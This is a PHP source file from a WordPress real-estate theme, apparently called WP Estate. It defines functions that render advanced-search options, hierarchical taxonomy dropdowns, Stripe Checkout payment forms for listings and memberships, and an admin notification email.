                        print '<script type="text/javascript">
                            //<![CDATA[
                            jQuery(document).ready(function(){
                                    jQuery("#'.$slug.$random_id.'").datepicker({
                                            dateFormat : "yy-mm-dd"
                                    });
                            });
                            //]]>
                            </script>';
                      }
           

            } 
            print $return_string;
         }
endif; //


if( !function_exists('show_extended_search') ): 
    function show_extended_search($tip){
        print '<div class="adv_extended_options_text" id="adv_extended_options_text_'.$tip.'">'.__('More Search Options','wpestate').'</div>';
               print '<div class="extended_search_check_wrapper">';
               print '<span id="adv_extended_close_'.$tip.'"><i class="fa fa-times"></i></span>';

               $advanced_exteded   =   get_option( 'wp_estate_advanced_exteded', true); 

               foreach($advanced_exteded as $checker => $value){
                   $post_var_name  =   str_replace(' ','_', trim($value) );
                   $input_name     =   wpestate_limit45(sanitize_title( $post_var_name ));
                   $input_name     =   sanitize_key($input_name);

                   if (function_exists('icl_translate') ){
                       $value     =   icl_translate('wpestate','wp_estate_property_custom_amm_'.$value, $value ) ;                                      
                   }

                    $value= str_replace('_',' ', trim($value) );
                    if($value!='none'){
                        $check_selected='';
                        if( isset($_GET[$input_name]) && $_GET[$input_name]=='1'  ){
                        $check_selected=' checked ';  
                        }
                    print '<div class="extended_search_checker"><input type="checkbox" id="'.$input_name.$tip.'" name="'.$input_name.'" value="1" '.$check_selected.'><label for="'.$input_name.$tip.'">'.$value. '</label></div>';
                  }
               }

        print '</div>';    
    }
endif;






////////////////////////////////////////////////////////////////////////////////
/// show hieracy categeg
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('wpestate_hierarchical_category_childen') ): 
    function wpestate_hierarchical_category_childen($taxonomy, $cat,$args ) {

        $args['parent']             =   $cat;
        $children                   =   get_terms($taxonomy,$args);


        $children_categ_select_list =   '';
        foreach ($children as $categ) {
            $area_addon =   '';
            $city_addon =   '';

            if($taxonomy=='property_city'){
                $string       =     wpestate_limit45 ( sanitize_title ( $categ->slug ) );              
                $slug         =     sanitize_key($string);
                $city_addon   =     ' data-value2="'.$slug.'" ';
            }

            if($taxonomy=='property_area'){
                $term_meta    =   get_option( "taxonomy_$categ->term_id");
                $string       =   wpestate_limit45 ( sanitize_title ( $term_meta['cityparent'] ) );              
                $slug         =   sanitize_key($string);
                $area_addon   =   ' data-parentcity="' . $slug . '" ';

            }

            $children_categ_select_list     .=   '<li role="presentation" data-value="'.$categ->slug.'" '.$city_addon.' '.$area_addon.' > - '. ucwords ( urldecode( $categ->name ) ).' ('.$categ->count.')'.'</li>';
        }
        return $children_categ_select_list;
    }
endif;

////////////////////////////////////////////////////////////////////////////////
/// get select arguments
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('wpestate_get_select_arguments') ): 
    function wpestate_get_select_arguments(){
        $args = array(
                'hide_empty'    => true  ,
                'hierarchical'  => false,
                'pad_counts '   => true,
                'parent'        => 0
                ); 

        $show_empty_city_status = esc_html ( get_option('wp_estate_show_empty_city','') );
        if ($show_empty_city_status=='yes'){
            $args = array(
                'hide_empty'    => false  ,
                'hierarchical'  => false,
                'pad_counts '   => true,
                'parent'        => 0
                ); 
        }
        return $args;
    }
endif;
////////////////////////////////////////////////////////////////////////////////
/// show hieracy action
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_get_action_select_list') ): 
    function wpestate_get_action_select_list($args){
        $taxonomy           =   'property_action_category';
        $tax_terms          =   get_terms($taxonomy,$args);
        $action_select_list =   ' <li role="presentation" data-value="all">'. __('All Actions','wpestate').'</li>';
        $action_select_list_selected='';
        foreach ($tax_terms as $tax_term) {
            $action_select_list     .=  '<li  role="presentation" data-value="'.$tax_term->slug.'">'. ucwords ( urldecode($tax_term->name ) ).' ('.$tax_term->count.')'.'</li>';
            $action_select_list     .=   wpestate_hierarchical_category_childen($taxonomy, $tax_term->term_id,$args );       
        }
        return $action_select_list_selected.$action_select_list;
    }
endif;

////////////////////////////////////////////////////////////////////////////////
/// show hieracy categ
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('wpestate_get_category_select_list') ): 
    function wpestate_get_category_select_list($args){
        $taxonomy           =   'property_category';
        $categories         =   get_terms($taxonomy,$args);
        $categ_select_list  =  '<li role="presentation" data-value="all">'. __('All Types','wpestate').'</li>'; 

        foreach ($categories as $categ) {
            $categ_select_list     .=   '<li role="presentation" data-value="'.$categ->slug.'">'. ucwords ( urldecode( $categ->name ) ).' ('.$categ->count.')'.'</li>';
            $categ_select_list     .=   wpestate_hierarchical_category_childen($taxonomy, $categ->term_id,$args );    
        }
        return $categ_select_list;
    }
endif;

////////////////////////////////////////////////////////////////////////////////
/// show hieracy city
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_get_city_select_list') ): 
    function wpestate_get_city_select_list($args){
        $select_city_list   =    '<li role="presentation" data-value="all" data-value2="all">'. __('All Cities','wpestate').'</li>';
        $taxonomy           =   'property_city';
        $tax_terms_city     =   get_terms($taxonomy,$args);

        foreach ($tax_terms_city as $tax_term) {
            $string       =   wpestate_limit45 ( sanitize_title ( $tax_term->slug ) );              
            $slug         =   sanitize_key($string);
            $select_city_list     .=   '<li role="presentation" data-value="'.$tax_term->slug.'" data-value2="'.$slug.'">'. ucwords ( urldecode( $tax_term->name) ).' ('.$tax_term->count.')'.'</li>';
            $select_city_list     .=   wpestate_hierarchical_category_childen($taxonomy, $tax_term->term_id,$args );    
        }
        return $select_city_list;
    }
endif;



////////////////////////////////////////////////////////////////////////////////
/// show hieracy area county state
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_get_county_state_select_list') ): 
function wpestate_get_county_state_select_list($args){
    $select_county_list   =   '<li role="presentation" data-value="all">'.__('All Counties/States','wpestate').'</li>';
    $taxonomy           =   'property_county_state';
    $tax_terms_county    =   get_terms($taxonomy,$args);

    foreach ($tax_terms_county as $tax_term) {
        $string       =   wpestate_limit45 ( sanitize_title ( $tax_term->slug ) );              
        $slug         =   sanitize_key($string);
        $select_county_list     .=   '<li role="presentation" data-value="'.$tax_term->slug.'" data-value2="'.$slug.'">'. ucwords ( urldecode( $tax_term->name) ).' ('.$tax_term->count.')'.'</li>';
        $select_county_list     .=   wpestate_hierarchical_category_childen($taxonomy, $tax_term->term_id,$args );    
    }
    return $select_county_list;
}
endif;


////////////////////////////////////////////////////////////////////////////////
/// show hieracy area
////////////////////////////////////////////////////////////////////////////////


if( !function_exists('wpestate_get_area_select_list') ): 
function wpestate_get_area_select_list($args){
    $select_area_list   =   '<li role="presentation" data-value="all">'.__('All Areas','wpestate').'</li>';
    $taxonomy           =   'property_area';
    $tax_terms_area     =   get_terms($taxonomy,$args);

    foreach ($tax_terms_area as $tax_term) {
        $term_meta    =   get_option( "taxonomy_$tax_term->term_id");
        $string       =   wpestate_limit45 ( sanitize_title ( $term_meta['cityparent'] ) );              
        $slug         =   sanitize_key($string);

        $select_area_list .=   '<li role="presentation" data-value="'.$tax_term->slug.'" data-parentcity="' . $slug . '">'. ucwords  (urldecode( $tax_term->name ) ).' ('.$tax_term->count.')'.'</li>';
        $select_area_list .=   wpestate_hierarchical_category_childen( $taxonomy, $tax_term->term_id,$args ); 
    }  
    return $select_area_list;
}
endif;



////////////////////////////////////////////////////////////////////////////////
/// show name on saved searches
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_get_custom_field_name') ): 
function wpestate_get_custom_field_name($query_name,$adv_search_what,$adv_search_label){
    $i=0;


    foreach($adv_search_what as $key=>$term){    
            $term         =   str_replace(' ', '_', $term);
            $slug         =   wpestate_limit45(sanitize_title( $term )); 
            $slug         =   sanitize_key($slug); 
            
            if($slug==$query_name){
                return  $adv_search_label[$key];
            }
            $i++;
    }
    
    return $query_name;
}
endif;

////////////////////////////////////////////////////////////////////////////////
/// get author
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpsestate_get_author') ): 
    function wpsestate_get_author( $post_id = 0 ){
         $post = get_post( $post_id );
         return $post->post_author;
    }
endif;

////////////////////////////////////////////////////////////////////////////////
/// show stripe form per listing
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_show_stripe_form_per_listing') ): 
function wpestate_show_stripe_form_per_listing($stripe_class,$post_id,$price_submission,$price_featured_submission){
    require_once(get_template_directory().'/libs/stripe/lib/Stripe.php');
    $stripe_secret_key              =   esc_html( get_option('wp_estate_stripe_secret_key','') );
    $stripe_publishable_key         =   esc_html( get_option('wp_estate_stripe_publishable_key','') );

    $stripe = array(
      "secret_key"      => $stripe_secret_key,
      "publishable_key" => $stripe_publishable_key
    );

    Stripe::setApiKey($stripe['secret_key']);
    $processor_link=wpestate_get_stripe_link();
    $submission_curency_status = esc_html( get_option('wp_estate_submission_curency','') );
    global $current_user;
    get_currentuserinfo();
    $userID                 =   $current_user->ID ;
    $user_email             =   $current_user->user_email ;

    $price_submission_total =   $price_submission+$price_featured_submission;
    $price_submission_total =   $price_submission_total*100;
    $price_submission       =   $price_submission*100;
    print ' 
    <div class="stripe-wrapper '.$stripe_class.'">    
    <form action="'.$processor_link.'" method="post" id="stripe_form_simple">
        <div class="stripe_simple">
            <script src="https://checkout.stripe.com/checkout.js" 
            class="stripe-button"
            data-key="'. $stripe_publishable_key.'"
            data-amount="'.$price_submission.'" 
            data-email="'.$user_email.'"
            data-zip-code="true"
            data-currency="'.$submission_curency_status.'"
            data-label="'.__('Pay with Credit Card','wpestate').'"
            data-description="'.__('Submission Payment','wpestate').'">
            </script>
        </div>
        <input type="hidden" id="propid" name="propid" value="'.$post_id.'">
        <input type="hidden" id="submission_pay" name="submission_pay" value="1">
        <input type="hidden" name="userID" value="'.$userID.'">
        <input type="hidden" id="pay_ammout" name="pay_ammout" value="'.$price_submission.'">
    </form>

    <form action="'.$processor_link.'" method="post" id="stripe_form_featured">
        <div class="stripe_simple">
            <script src="https://checkout.stripe.com/checkout.js" 
            class="stripe-button"
            data-key="'. $stripe_publishable_key.'"
            data-amount="'.$price_submission_total.'" 
            data-email="'.$user_email.'"
            data-zip-code="true"
            data-currency="'.$submission_curency_status.'"
            data-label="'.__('Pay with Credit Card','wpestate').'"
            data-description="'.__('Submission & Featured Payment','wpestate').'">
            </script>
        </div>
        <input type="hidden" id="propid" name="propid" value="'.$post_id.'">
        <input type="hidden" id="submission_pay" name="submission_pay" value="1">
        <input type="hidden" id="featured_pay" name="featured_pay" value="1">
        <input type="hidden" name="userID" value="'.$userID.'">
        <input type="hidden" id="pay_ammout" name="pay_ammout" value="'.$price_submission_total.'">
    </form>
    </div>';
}
endif;



////////////////////////////////////////////////////////////////////////////////
/// show stripe form membership
////////////////////////////////////////////////////////////////////////////////

if( !function_exists('wpestate_show_stripe_form_membership') ): 
    function wpestate_show_stripe_form_membership(){
        require_once(get_template_directory().'/libs/stripe/lib/Stripe.php');

        global $current_user;
        get_currentuserinfo();
        $userID                 =   $current_user->ID;
        $user_login             =   $current_user->user_login;
        $user_email             =   get_the_author_meta( 'user_email' , $userID );

        $stripe_secret_key              =   esc_html( get_option('wp_estate_stripe_secret_key','') );
        $stripe_publishable_key         =   esc_html( get_option('wp_estate_stripe_publishable_key','') );

        $stripe = array(
          "secret_key"      => $stripe_secret_key,
          "publishable_key" => $stripe_publishable_key
        );
        $pay_ammout=9999;
        $pack_id='11';
        Stripe::setApiKey($stripe['secret_key']);
        $processor_link             =   wpestate_get_stripe_link();
        $submission_curency_status  =   esc_html( get_option('wp_estate_submission_curency','') );


        print ' 
        <form action="'.$processor_link.'" method="post" id="stripe_form">
            '.wpestate_get_stripe_buttons($stripe['publishable_key'],$user_email,$submission_curency_status).'

            <input type="hidden" id="pack_id" name="pack_id" value="'.$pack_id.'">
            <input type="hidden" name="userID" value="'.$userID.'">
            <input type="hidden" id="pay_ammout" name="pay_ammout" value="'.$pay_ammout.'">
        </form>';
    }
endif;




if( !function_exists('wpestate_get_stripe_buttons') ): 
    function wpestate_get_stripe_buttons($stripe_pub_key,$user_email,$submission_curency_status){
        wp_reset_query();
        $buttons='';
        $args = array(
            'post_type' => 'membership_package',
            'meta_query' => array(
                                 array(
                                     'key' => 'pack_visible',
                                     'value' => 'yes',
                                     'compare' => '=',
                                 )
                              )
            );
            $pack_selection = new WP_Query($args);
            $i=0;        
            while($pack_selection->have_posts() ){
                 $pack_selection->the_post();
                        $postid             = get_the_ID();

                        $pack_price         = get_post_meta($postid, 'pack_price', true)*100;
                        $title=get_the_title();
                        if($i==0){
                            $visible_stripe=" visible_stripe ";
                        }else{
                            $visible_stripe ='';
                        }
                        $i++;
                        $buttons.='
                        <div class="stripe_buttons '.$visible_stripe.' " id="'.  sanitize_title($title).'">
                            <script src="https://checkout.stripe.com/checkout.js" id="stripe_script"
                            class="stripe-button"
                            data-key="'. $stripe_pub_key.'"
                            data-amount="'.$pack_price.'" 
                            data-email="'.$user_email.'"
                            data-currency="'.$submission_curency_status.'"
                            data-zip-code="true"
                            data-address="true"
                            data-label="'.__('Pay with Credit Card','wpestate').'"
                            data-description="'.$title.' '.__('Package Payment','wpestate').'">
                            </script>
                        </div>';         
            }
            wp_reset_query();
        return $buttons;
    }
endif;





if( !function_exists('wpestate_email_to_admin') ): 
    function wpestate_email_to_admin($onlyfeatured){


            $headers = 'From: No Reply <noreply@'.$_SERVER['HTTP_HOST'].'>' . "\r\n";
            $message  = __('Hi there,','wpestate') . "\r\n\r\n";

            if($onlyfeatured==1){
                $title= sprintf(__('[%s] New Feature Upgrade ','wpestate'), get_option('blogname'));
                $message .= sprintf( __("You have a new featured submission on  %s! You should go check it out.",'wpestate'), get_option('blogname')) . "\r\n\r\n";

            }else{
                 $title= sprintf(__('[%s] New Paid Submission','wpestate'), get_option('blogname'));
                 $message .= sprintf( __("You have a new paid submission on  %s! You should go check it out.",'wpestate'), get_option('blogname')) . "\r\n\r\n";

            }


            wp_mail(get_option('admin_email'),
                    $title ,
                    $message,
                    $headers);

    }
endif;



if( !function_exists('wpestate_show_stripe_form_upgrade') ): 
function    wpestate_show_stripe_form_upgrade($stripe_class,$post_id,$price_submission,$price_featured_submission){
    require_once(get_template_directory().'/libs/stripe/lib/Stripe.php');
    $stripe_secret_key              =   esc_html( get_option('wp_estate_stripe_secret_key','') );
    $stripe_publishable_key         =   esc_html( get_option('wp_estate_stripe_publishable_key','') );

    $stripe = array(
      "secret_key"      => $stripe_secret_key,
      "publishable_key" => $stripe_publishable_key
    );

    Stripe::setApiKey($stripe['secret_key']);
    $processor_link=wpestate_get_stripe_link();
    global $current_user;
    get_currentuserinfo();
    $userID                 =   $current_user->ID ;
    $user_email             =   $current_user->user_email ;

    $submission_curency_status  =   esc_html( get_option('wp_estate_submission_curency','') );
    $price_featured_submission  =   $price_featured_submission*100;

    print ' 
    <div class="stripe_upgrade">    
    <form action="'.$processor_link.'" method="post" >
    <div class="stripe_simple upgrade_stripe">
        <script src="https://checkout.stripe.com/checkout.js" 
        class="stripe-button"
        data-key="'. $stripe_publishable_key.'"
        data-amount="'.$price_featured_submission.'" 
        data-zip-code="true"
        data-email="'.$user_email.'"
        data-currency="'.$submission_curency_status.'"
        data-panel-label="'.__('Upgrade to Featured','wpestate').'"
        data-label="'.__('Upgrade to Featured','wpestate').'"
        data-description="'.__(' Featured Payment','wpestate').'">

        </script>
    </div>
    <input type="hidden" id="propid" name="propid" value="'.$post_id.'">
    <input type="hidden" id="submission_pay" name="submission_pay" value="1">
    <input type="hidden" id="is_upgrade" name="is_upgrade" value="1">
    <input type="hidden" name="userID" value="'.$userID.'">
    <input type="hidden" id="pay_ammout" name="pay_ammout" value="'.$price_featured_submission.'">
    </form>
    </div>';
}
endif;




///////////////////////////////////////////////////////////////////////////////////////////
// dasboaord search link
///////////////////////////////////////////////////////////////////////////////////////////



if( !function_exists('get_dasboard_searches_link') ):
function get_dasboard_searches_link(){
    $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => 'user_dashboard_search_result.php'
        ));

    if( $pages ){
        $dash_link = get_permalink( $pages[0]->ID);
    }else{
        $dash_link=home_url();
    }  
    
    return $dash_link;
}
endif; // end   get_dashboard_link  
                                
?>